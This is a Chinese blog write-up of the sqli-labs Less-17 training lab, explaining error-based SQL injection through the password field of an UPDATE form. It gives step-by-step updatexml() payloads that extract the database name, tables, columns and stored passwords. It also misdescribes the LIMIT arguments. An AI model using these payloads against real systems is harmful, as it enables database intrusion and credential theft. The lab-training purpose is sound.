# 原创
：  （手工）【sqli-labs17】update注入：原理、利用过程

# （手工）【sqli-labs17】update注入：原理、利用过程

**目录**

[推荐：](#%C2%A0%E6%8E%A8%E8%8D%90%EF%BC%9A)

[一、（手工）SQL注入基本步骤：](#%E4%B8%80%E3%80%81%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%88%E6%89%8B%E5%B7%A5%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[二、Less17（POST-Update Query -Error Based String）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[2.1、简介：（更新注入-单引号）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[2.2、第一步：注入点测试](#2.2%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[ 2.3、第二步：分析过滤](#%C2%A02.3%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%88%86%E6%9E%90%E8%BF%87%E6%BB%A4)

[2.4、第三步：暴库](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%9A%B4%E5%BA%93)

[2.5、第四步：爆表名](#%C2%A0%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%88%86%E8%A1%A8%E5%90%8D)

[2.6、第五步：爆字段](#%C2%A0%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5)

[2.7、第六步：爆数据](#%C2%A0%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

---


> 
<h2>推荐：</h2>
[【SQL注入】UPDATE、insert、delete注入<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125670581?spm=1001.2014.3001.5502](https://blog.csdn.net/qq_53079406/article/details/125670581?spm=1001.2014.3001.5502)


---


---


## 一、（手工）SQL注入基本步骤：

> 
第一步：注入点测试
第二步：分析权限、过滤
第三步：爆数据库名
第四步：爆表名
第五步：爆字段名
第六步：爆数据


---


---


## 二、Less17（POST-Update Query -Error Based String）

> 
<h3>2.1、简介：（更新注入-单引号）</h3>
请求方法：POST
方法：update报错回显


> 
<h3>2.2、第一步：注入点测试</h3>
在第一个输入框中，输入闭合都失败
在第二个密码输入框中，成功闭合了




> 
<h3> 2.3、第二步：分析过滤</h3>
<pre><code>
function check_input($value)
    {
    if(!empty($value))
        {
        // truncation (see comments)
        $value = substr($value,0,15);
        }
 
        // Stripslashes if magic quotes enabled
        if (get_magic_quotes_gpc())
//magic_quotes_gpc = On，magic_quotes_gpc 函数在 php 中的作用是判断解析用户提示的数据
如包括有：post、get、cookie过来的数据增加转义字符“\”
避免数据库语句因为特殊字符引起的污染而出现致命的错误
单引号（’）双引号（”）反斜线（\）NULL（NULL 字符）（字符都会被加上反斜线）
            {
            $value = stripslashes($value);
//stripslashes() 删除由 addslashes() 函数添加的反斜杠
            }
 
        // Quote if not a number
        if (!ctype_digit($value))
//ctype_digit() 判断是不是数字，是数字就返回 true，否则返回 false
            {
            $value = "'" . mysql_real_escape_string($value) . "'";
//mysql_real_escape_string() 转义 SQL 语句中使用的字符串中的特殊字符
            }
        
    else
        {
        $value = intval($value);
//intval() 整型转换
        }
    return $value;
    }
    
</code></pre>
但是没有对密码进行限制，可以在password输入框中拼接到SQL语句
所以需要有对的用户名，然后密码后面的验证可以注释掉


> 
<h3>2.4、第三步：暴库</h3>
已经给出了用户名Dhakkan
aaaaaa' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#
爆出数据库（或者）
aaa' or updatexml(1,concat(0x7e,(database()),0x7e),0) or '




> 
<h3>2.5、第四步：爆表名</h3>
' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),0) or '


 



> 
<h3>2.6、第五步：爆字段</h3>
' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'),0x7e),0) or '


 




> 
<h3>2.7、第六步：爆数据</h3>
' or updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),0) or '
You can't specify target table 'users' for update in FROM clause
(您无法指定目标表“用户”以获取从子句中的更新)
可能是有权限限制


那就再嵌套一层试试
'or updatexml(1,concat(0x7e,(select password from (select password from users limit 0,1) test ),0x7e),1) or'

只需要修改limit函数的第一个参数就可以
 limit 0,1
0表示开始字符位置，1表示字符间距

